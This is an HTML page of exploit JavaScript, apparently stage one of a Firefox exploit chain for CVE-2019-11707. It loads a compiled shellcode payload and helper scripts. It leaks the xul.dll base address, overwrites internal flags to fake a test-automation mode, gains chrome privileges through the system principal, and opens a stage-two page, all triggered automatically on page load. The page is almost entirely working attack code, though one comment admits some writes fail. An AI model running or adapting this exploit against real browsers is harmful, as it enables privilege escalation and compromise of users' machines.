<html>
<body>
<head>
<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
<meta content="utf-8" http-equiv="encoding">
<script src="./../Payloads/Compiled/JS/WinExecSleep_Uint8Array_64-bit.js">
</script>
<script src="./Bug.js">
</script>
<script src="./Primitives.js">
</script>
<script>

function Exploit()
{

    if( window.netscape.security.PrivilegeManager == undefined )
    {
        try{
			InitStrongRWPrimitive();
		// 0:000> ? xul!sAutomationPrefIsSet - xul
// Evaluate expression: 85724947 = 00000000`051c0f13
//const XulsAutomationPrefIsSet = 0x051c0f13n;
// 0:000> ? xul!disabledForTest - xul
// Evaluate expression: 85400792 = 00000000`05171cd8
//const XuldisabledForTest = 0x05171cd8n;

		    /* Set  sAutomationPrefIsSet, sPrefCacheAdded  and  disabledForTest variables to true (xpcpublic.h)*/
		/* this is to make AreNonLocalConnectionsDisabled() and IsInAutomation() return true*/
		/* and make the browser think it is being executed in testing mode */
		
		// Confirmed that the first 2 of these fall within xul.dll .data section at a location with 0's, the 3rd is also in .data but is pointing at a string
		// Confirmed the writes do NOT work properly
		
			HelperDbl[0] = LeakedXulAddress;
			DebugLog("Leaked xul.dll address: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
			HelperDword[0] = HelperDword[0] - 0x1000;
			LeakedXulAddress = HelperDbl[0];
			HelperDword[0] = HelperDword[0] + 0x05034e1b;
			var sAutomationPrefIsSet  = HelperDbl[0]; 
			DebugLog("sAutomationPrefIsSet xul.dll address: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
			//StrongWriteDword(sAutomationPrefIsSet, 0x1);
			WeakWriteDbl(sAutomationPrefIsSet, 1);

			HelperDbl[0] = LeakedXulAddress;
			HelperDword[0] = HelperDword[0] + 0x05034E1c;
			var sPrefCacheAdded  = HelperDbl[0]; 
			DebugLog("sPrefCacheAdded xul.dll address: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
			//StrongWriteDword(sPrefCacheAdded, 0x1);
			WeakWriteDbl(sPrefCacheAdded, 1);
			
			HelperDbl[0] = LeakedXulAddress;
			HelperDword[0] = HelperDword[0] + 0x04fe4dc3;
			var disabledForTest  = HelperDbl[0]; 
			DebugLog("disabledForTest xul.dll address: 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
			//StrongWriteDword(disabledForTest, 0x1);
			WeakWriteDbl(disabledForTest, 1);
			
			window.netscape.security.PrivilegeManager.enablePrivilege();
			
			
        }                   //(sometimes the confusion does not get triggeret on first load)
        catch (error) {}
        finally{
            location.reload();
        }
    }else{
		window.netscape.security.PrivilegeManager.enablePrivilege();
		alert("successfully enabled privilege");
		const { Services } = Components.utils.import('resource://gre/modules/Services.jsm');
		
		systemPrincipal = Services.scriptSecurityManager.getSystemPrincipal();

		if(systemPrincipal) {
			alert("successfully obtained system principal");
			
			const Sbx = Cu.Sandbox(Services.scriptSecurityManager.getSystemPrincipal());

			const Code = _GetDocShellFromWindow.toSource();
			Components.utils.evalInSandbox(Code, Sbx);
			const DocShell = Sbx._GetDocShellFromWindow(window);
			Components.utils.nukeSandbox(Sbx);
			DocShell.messageManager.sendSyncMessage('Prompt:Open', { uri: "file:///C:/Users/PrimaryUser/Documents/GitHub/Exploits/CVE-2019-11707/Stage2_Forrest_Orr_CVE-2019-11707_64-bit.html" });
		}
		else {
			alert("failed to obtain system principal");
		}
    }
}

function _GetDocShellFromWindow(Win) {
    return Win.docShell;
}

</script>
</head>
<body>
<script type="text/javascript">
    window.addEventListener('load', (event) => { Exploit(); });
</script>
</body>
</html>
